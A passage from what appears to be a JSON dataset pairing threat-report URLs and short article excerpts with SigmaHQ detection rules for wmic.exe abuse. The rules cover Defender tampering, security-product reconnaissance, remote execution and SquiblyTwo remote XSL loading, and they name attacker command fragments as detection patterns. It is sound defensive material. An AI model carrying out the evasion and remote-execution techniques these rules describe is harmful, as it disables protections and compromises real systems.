      "id": "51cbac1e-eee3-4a90-b1b7-358efb81fa0a",
      "status": "test",
      "description": "Detects potential tampering with Windows Defender settings such as adding exclusion using wmic",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1562.001/T1562.001.md",
        "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/",
        "https://www.bleepingcomputer.com/news/security/iobit-forums-hacked-to-spread-ransomware-to-its-members/"
      ],
      "author": "frack113",
      "date": "2022-12-11",
      "modified": "2023-02-14",
      "tags": [
        "attack.credential-access",
        "attack.t1546.008"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "wmic.exe"
          },
          {
            "Image|endswith": "\\WMIC.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_namespace_defender.yml"
  },
  "661": {
    "url": "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/",
    "markdown": "# GootKit Malware Bypasses Windows Defender by Setting Path Exclusions September 6, 2019 As Windows Defender matures and becomes tightly integrated into Windows 10, malware writers are creating techniques to evade its detection. Such is the case with the GootKit banking Trojan, which uses a UAC bypass and WMIC commands to exclude the malware executable from being scanned by Windows Defender Antivirus. GootKit is a banking Trojan that attempts to steal the online banking credentials of infected users through video capture and redirects to fake banking sites under the attacker's control. An interesting aspect of this infection is that it",
    "sigma_rule": {
      "title": "Potential Windows Defender Tampering Via Wmic.EXE",
      "id": "51cbac1e-eee3-4a90-b1b7-358efb81fa0a",
      "status": "test",
      "description": "Detects potential tampering with Windows Defender settings such as adding exclusion using wmic",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1562.001/T1562.001.md",
        "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/",
        "https://www.bleepingcomputer.com/news/security/iobit-forums-hacked-to-spread-ransomware-to-its-members/"
      ],
      "author": "frack113",
      "date": "2022-12-11",
      "modified": "2023-02-14",
      "tags": [
        "attack.credential-access",
        "attack.t1546.008"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "wmic.exe"
          },
          {
            "Image|endswith": "\\WMIC.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_namespace_defender.yml"
  },
  "662": {
    "url": "https://www.bleepingcomputer.com/news/security/iobit-forums-hacked-to-spread-ransomware-to-its-members/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Windows Defender Tampering Via Wmic.EXE",
      "id": "51cbac1e-eee3-4a90-b1b7-358efb81fa0a",
      "status": "test",
      "description": "Detects potential tampering with Windows Defender settings such as adding exclusion using wmic",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1562.001/T1562.001.md",
        "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/",
        "https://www.bleepingcomputer.com/news/security/iobit-forums-hacked-to-spread-ransomware-to-its-members/"
      ],
      "author": "frack113",
      "date": "2022-12-11",
      "modified": "2023-02-14",
      "tags": [
        "attack.credential-access",
        "attack.t1546.008"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "wmic.exe"
          },
          {
            "Image|endswith": "\\WMIC.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_namespace_defender.yml"
  },
  "663": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/",
    "markdown": "# Profiling DEV-0270: PHOSPHORUS’ ransomware operations **Research** | **Threat intelligence** | **Threat actors** **September 7, 2022** --- > **April 2023 update** – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. > > - **PHOSPHORUS** is now tracked as **Mint Sandstorm** > - **DEV-0270** is now tracked as **Storm-0270** > > To learn more about this evolution, how the new taxonomy represents the origin, unique traits, and impact of threat actors, and a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy.",
    "sigma_rule": {
      "title": "Computer System Reconnaissance Via Wmic.EXE",
      "id": "9d7ca793-f6bd-471c-8d0f-11e68b2f0d2f",
      "status": "test",
      "description": "Detects execution of wmic utility with the \"computersystem\" flag in order to obtain information about the machine such as the domain, username, model, etc.",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-08",
      "modified": "2023-02-14",
      "tags": [
        "attack.discovery",
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "computersystem"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_recon_computersystem.yml"
  },
  "664": {
    "url": "https://thedfirreport.com/2023/03/06/2022-year-in-review/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Product Reconnaissance Via Wmic.EXE",
      "id": "15434e33-5027-4914-88d5-3d4145ec25a9",
      "status": "test",
      "description": "Detects the execution of WMIC in order to get a list of firewall and antivirus products",
      "references": [
        "https://thedfirreport.com/2023/03/06/2022-year-in-review/",
        "https://www.yeahhub.com/list-installed-programs-version-path-windows/",
        "https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product"
      ],
      "author": "Nasreddine Bencherchali",
      "date": "2023-02-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "Product"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_recon_product.yml"
  },
  "665": {
    "url": "https://www.yeahhub.com/list-installed-programs-version-path-windows/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Product Reconnaissance Via Wmic.EXE",
      "id": "15434e33-5027-4914-88d5-3d4145ec25a9",
      "status": "test",
      "description": "Detects the execution of WMIC in order to get a list of firewall and antivirus products",
      "references": [
        "https://thedfirreport.com/2023/03/06/2022-year-in-review/",
        "https://www.yeahhub.com/list-installed-programs-version-path-windows/",
        "https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product"
      ],
      "author": "Nasreddine Bencherchali",
      "date": "2023-02-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "Product"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_recon_product.yml"
  },
  "666": {
    "url": "https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Product Reconnaissance Via Wmic.EXE",
      "id": "15434e33-5027-4914-88d5-3d4145ec25a9",
      "status": "test",
      "description": "Detects the execution of WMIC in order to get a list of firewall and antivirus products",
      "references": [
        "https://thedfirreport.com/2023/03/06/2022-year-in-review/",
        "https://www.yeahhub.com/list-installed-programs-version-path-windows/",
        "https://learn.microsoft.com/en-us/answers/questions/253555/software-list-inventory-wmic-product"
      ],
      "author": "Nasreddine Bencherchali",
      "date": "2023-02-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "Product"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_recon_product.yml"
  },
  "667": {
    "url": "https://github.com/albertzsigovits/malware-notes/blob/c820c7fea76cf76a861b28ebc77e06100e20ec29/Ransomware/Maze.md",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Product Class Reconnaissance Via Wmic.EXE",
      "id": "e568650b-5dcd-4658-8f34-ded0b1e13992",
      "status": "test",
      "description": "Detects the execution of WMIC in order to get a list of firewall, antivirus and antispywware products.\nAdversaries often enumerate security products installed on a system to identify security controls and potential ways to evade detection or disable protection mechanisms.\nThis information helps them plan their next attack steps and choose appropriate techniques to bypass security measures.\n",
      "references": [
        "https://github.com/albertzsigovits/malware-notes/blob/c820c7fea76cf76a861b28ebc77e06100e20ec29/Ransomware/Maze.md",
        "https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1",
        "https://www.trendmicro.com/en_us/research/25/c/socgholishs-intrusion-techniques-facilitate-distribution-of-rans.html"
      ],
      "author": "Michael Haag, Florian Roth (Nextron Systems), juju4, oscd.community, Swachchhanda Shrawan Poudel (Nextron Systems)",
      "date": "2023-02-14",
      "modified": "2025-03-17",
      "tags": [
        "attack.execution",
        "attack.t1047",
        "attack.discovery",
        "attack.t1082"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "AntiVirusProduct",
            "AntiSpywareProduct",
            "FirewallProduct"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate use of wmic.exe for reconnaissance of firewall, antivirus and antispywware products."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_recon_product_class.yml"
  },
  "668": {
    "url": "https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Product Class Reconnaissance Via Wmic.EXE",
      "id": "e568650b-5dcd-4658-8f34-ded0b1e13992",
      "status": "test",
      "description": "Detects the execution of WMIC in order to get a list of firewall, antivirus and antispywware products.\nAdversaries often enumerate security products installed on a system to identify security controls and potential ways to evade detection or disable protection mechanisms.\nThis information helps them plan their next attack steps and choose appropriate techniques to bypass security measures.\n",
      "references": [
        "https://github.com/albertzsigovits/malware-notes/blob/c820c7fea76cf76a861b28ebc77e06100e20ec29/Ransomware/Maze.md",
        "https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1",
        "https://www.trendmicro.com/en_us/research/25/c/socgholishs-intrusion-techniques-facilitate-distribution-of-rans.html"
      ],
      "author": "Michael Haag, Florian Roth (Nextron Systems), juju4, oscd.community, Swachchhanda Shrawan Poudel (Nextron Systems)",
      "date": "2023-02-14",
      "modified": "2025-03-17",
      "tags": [
        "attack.execution",
        "attack.t1047",
        "attack.discovery",
        "attack.t1082"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "AntiVirusProduct",
            "AntiSpywareProduct",
            "FirewallProduct"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate use of wmic.exe for reconnaissance of firewall, antivirus and antispywware products."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_recon_product_class.yml"
  },
  "669": {
    "url": "https://www.trendmicro.com/en_us/research/25/c/socgholishs-intrusion-techniques-facilitate-distribution-of-rans.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Product Class Reconnaissance Via Wmic.EXE",
      "id": "e568650b-5dcd-4658-8f34-ded0b1e13992",
      "status": "test",
      "description": "Detects the execution of WMIC in order to get a list of firewall, antivirus and antispywware products.\nAdversaries often enumerate security products installed on a system to identify security controls and potential ways to evade detection or disable protection mechanisms.\nThis information helps them plan their next attack steps and choose appropriate techniques to bypass security measures.\n",
      "references": [
        "https://github.com/albertzsigovits/malware-notes/blob/c820c7fea76cf76a861b28ebc77e06100e20ec29/Ransomware/Maze.md",
        "https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1",
        "https://www.trendmicro.com/en_us/research/25/c/socgholishs-intrusion-techniques-facilitate-distribution-of-rans.html"
      ],
      "author": "Michael Haag, Florian Roth (Nextron Systems), juju4, oscd.community, Swachchhanda Shrawan Poudel (Nextron Systems)",
      "date": "2023-02-14",
      "modified": "2025-03-17",
      "tags": [
        "attack.execution",
        "attack.t1047",
        "attack.discovery",
        "attack.t1082"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "AntiVirusProduct",
            "AntiSpywareProduct",
            "FirewallProduct"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate use of wmic.exe for reconnaissance of firewall, antivirus and antispywware products."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_recon_product_class.yml"
  },
  "670": {
    "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a",
    "markdown": "",
    "sigma_rule": {
      "title": "System Disk And Volume Reconnaissance Via Wmic.EXE",
      "id": "c79da740-5030-45ec-a2e0-479e824a562c",
      "related": [
        {
          "id": "d85ecdd7-b855-4e6e-af59-d9c78b5b861e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "An adversary might use WMI to discover information about the system, such as the volume name, size,\nfree space, and other disk information. This can be done using the `wmic` command-line utility and has been\nobserved being used by threat actors such as Volt Typhoon.\n",
      "references": [
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic"
      ],
      "author": "Stephen Lincoln `@slincoln-aiq`(AttackIQ)",
      "date": "2024-02-02",
      "tags": [
        "attack.execution",
        "attack.discovery",
        "attack.t1047",
        "attack.t1082"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\WMIC.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "volume",
            "path win32_logicaldisk"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_recon_volume.yml"
  },
  "671": {
    "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic",
    "markdown": "",
    "sigma_rule": {
      "title": "System Disk And Volume Reconnaissance Via Wmic.EXE",
      "id": "c79da740-5030-45ec-a2e0-479e824a562c",
      "related": [
        {
          "id": "d85ecdd7-b855-4e6e-af59-d9c78b5b861e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "An adversary might use WMI to discover information about the system, such as the volume name, size,\nfree space, and other disk information. This can be done using the `wmic` command-line utility and has been\nobserved being used by threat actors such as Volt Typhoon.\n",
      "references": [
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic"
      ],
      "author": "Stephen Lincoln `@slincoln-aiq`(AttackIQ)",
      "date": "2024-02-02",
      "tags": [
        "attack.execution",
        "attack.discovery",
        "attack.t1047",
        "attack.t1082"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\WMIC.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "volume",
            "path win32_logicaldisk"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_recon_volume.yml"
  },
  "672": {
    "url": "https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/",
    "markdown": "# MoonBounce: the dark side of UEFI firmware **APT reports** **20 Jan 2022** ## Table of Contents - What happened? - Revisiting the current state of the art in persistent attacks - Our discovery: a sophisticated implant within UEFI firmware - Other pieces of malware on the radar - Who were the targets? - What were the attackers trying to achieve? - Network infrastructure - Who is behind the MoonBounce attack? - Conclusion - MoonBounce indicators of compromise ## What happened? At the end of 2021, we were made aware of a UEFI firmware-level compromise through logs from our Firmware",
    "sigma_rule": {
      "title": "WMIC Remote Command Execution",
      "id": "7773b877-5abb-4a3e-b9c9-fd0369b59b00",
      "related": [
        {
          "id": "e42af9df-d90b-4306-b7fb-05c863847ebd",
          "type": "obsolete"
        },
        {
          "id": "09af397b-c5eb-4811-b2bb-08b3de464ebf",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the execution of WMIC to query information on a remote system",
      "references": [
        "https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\WMIC.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "/node:"
        },
        "filter_localhost": {
          "CommandLine|contains": [
            "/node:127.0.0.1 ",
            "/node:localhost "
          ]
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_remote_execution.yml"
  },
  "673": {
    "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic",
    "markdown": "",
    "sigma_rule": {
      "title": "WMIC Remote Command Execution",
      "id": "7773b877-5abb-4a3e-b9c9-fd0369b59b00",
      "related": [
        {
          "id": "e42af9df-d90b-4306-b7fb-05c863847ebd",
          "type": "obsolete"
        },
        {
          "id": "09af397b-c5eb-4811-b2bb-08b3de464ebf",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the execution of WMIC to query information on a remote system",
      "references": [
        "https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\WMIC.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "/node:"
        },
        "filter_localhost": {
          "CommandLine|contains": [
            "/node:127.0.0.1 ",
            "/node:localhost "
          ]
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_remote_execution.yml"
  },
  "674": {
    "url": "https://web.archive.org/web/20190209154607/https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential SquiblyTwo Technique Execution",
      "id": "8d63dadf-b91b-4187-87b6-34a1114577ea",
      "status": "test",
      "description": "Detects potential SquiblyTwo attack technique with possible renamed WMIC via Imphash and OriginalFileName fields",
      "references": [
        "https://web.archive.org/web/20190209154607/https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html",
        "https://twitter.com/mattifestation/status/986280382042595328",
        "https://atomicredteam.io/defense-evasion/T1220/",
        "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
      ],
      "author": "Markus Neis, Florian Roth",
      "date": "2019-01-16",
      "modified": "2024-11-23",
      "tags": [
        "attack.defense-evasion",
        "attack.t1047",
        "attack.t1220",
        "attack.execution",
        "attack.t1059.005",
        "attack.t1059.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_pe": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          },
          {
            "Hashes|contains": [
              "IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E",
              "IMPHASH=37777A96245A3C74EB217308F3546F4C",
              "IMPHASH=9D87C9D67CE724033C0B40CC4CA1B206"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "format:",
            "http"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_squiblytwo_bypass.yml"
  },
  "675": {
    "url": "https://twitter.com/mattifestation/status/986280382042595328",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential SquiblyTwo Technique Execution",
      "id": "8d63dadf-b91b-4187-87b6-34a1114577ea",
      "status": "test",
      "description": "Detects potential SquiblyTwo attack technique with possible renamed WMIC via Imphash and OriginalFileName fields",
      "references": [
        "https://web.archive.org/web/20190209154607/https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html",
        "https://twitter.com/mattifestation/status/986280382042595328",
        "https://atomicredteam.io/defense-evasion/T1220/",
        "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
      ],
      "author": "Markus Neis, Florian Roth",
      "date": "2019-01-16",
      "modified": "2024-11-23",
      "tags": [
        "attack.defense-evasion",
        "attack.t1047",
        "attack.t1220",
        "attack.execution",
        "attack.t1059.005",
        "attack.t1059.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_pe": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          },
          {
            "Hashes|contains": [
              "IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E",
              "IMPHASH=37777A96245A3C74EB217308F3546F4C",
              "IMPHASH=9D87C9D67CE724033C0B40CC4CA1B206"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "format:",
            "http"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_squiblytwo_bypass.yml"
  },
  "676": {
    "url": "https://atomicredteam.io/defense-evasion/T1220/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential SquiblyTwo Technique Execution",
      "id": "8d63dadf-b91b-4187-87b6-34a1114577ea",
      "status": "test",
      "description": "Detects potential SquiblyTwo attack technique with possible renamed WMIC via Imphash and OriginalFileName fields",
      "references": [
        "https://web.archive.org/web/20190209154607/https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html",
        "https://twitter.com/mattifestation/status/986280382042595328",
        "https://atomicredteam.io/defense-evasion/T1220/",
        "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
      ],
      "author": "Markus Neis, Florian Roth",
      "date": "2019-01-16",
      "modified": "2024-11-23",
      "tags": [
        "attack.defense-evasion",
        "attack.t1047",
        "attack.t1220",
        "attack.execution",
        "attack.t1059.005",
        "attack.t1059.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_pe": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          },
          {
            "Hashes|contains": [
              "IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E",
              "IMPHASH=37777A96245A3C74EB217308F3546F4C",
              "IMPHASH=9D87C9D67CE724033C0B40CC4CA1B206"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "format:",
            "http"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_squiblytwo_bypass.yml"
  },
  "677": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Wmic/",
    "markdown": "# /Wmic.exe ## Function List - Alternate data streams - Execute (WSH) - Copy The WMI command-line (WMIC) utility provides a command-line interface for WMI. ### Paths: - C:\\Windows\\System32\\wbem\\wmic.exe - C:\\Windows\\SysWOW64\\wbem\\wmic.exe ### Resources: - Stack Overflow: WMIC - How to use process call create with a specific working directory - Subt0x11: wmic.exe whitelisting bypass hacking - Twitter: subTee ### Detections: - Sigma: image_load_wmic_remote_xsl_scripting_dlls.yml - Sigma: proc_creation_win_wmic_xsl_script_processing.yml - Sigma: proc_creation_win_wmic_squiblytwo_bypass.yml - Sigma: proc_creation_win_wmic_eventconsumer_creation.yml - Elastic: defense_evasion_suspicious_wmi_script.toml - Elastic: persistence_via_windows_management_instrumentation_event_subscription.toml - Elastic: defense_evasion_suspicious_managedcode_host_process.toml - Splunk: xsl_script_execution_with_wmic.yml - Splunk: remote_wmi_command_attempt.yml - Splunk: remote_process_instantiation_via_wmi.yml - Splunk: process_execution_via_wmi.yml - BlockRule: Microsoft Recommended Block Rules -",
    "sigma_rule": {
      "title": "Potential SquiblyTwo Technique Execution",
      "id": "8d63dadf-b91b-4187-87b6-34a1114577ea",
      "status": "test",
      "description": "Detects potential SquiblyTwo attack technique with possible renamed WMIC via Imphash and OriginalFileName fields",
      "references": [
        "https://web.archive.org/web/20190209154607/https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html",
        "https://twitter.com/mattifestation/status/986280382042595328",
        "https://atomicredteam.io/defense-evasion/T1220/",
        "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
      ],
      "author": "Markus Neis, Florian Roth",
      "date": "2019-01-16",
      "modified": "2024-11-23",
      "tags": [
        "attack.defense-evasion",
        "attack.t1047",
        "attack.t1220",
        "attack.execution",
        "attack.t1059.005",
        "attack.t1059.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_pe": [
          {
            "Image|endswith": "\\wmic.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          },
          {
            "Hashes|contains": [
              "IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E",
              "IMPHASH=37777A96245A3C74EB217308F3546F4C",
              "IMPHASH=9D87C9D67CE724033C0B40CC4CA1B206"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "format:",
            "http"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_squiblytwo_bypass.yml"
  },
  "678": {
    "url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
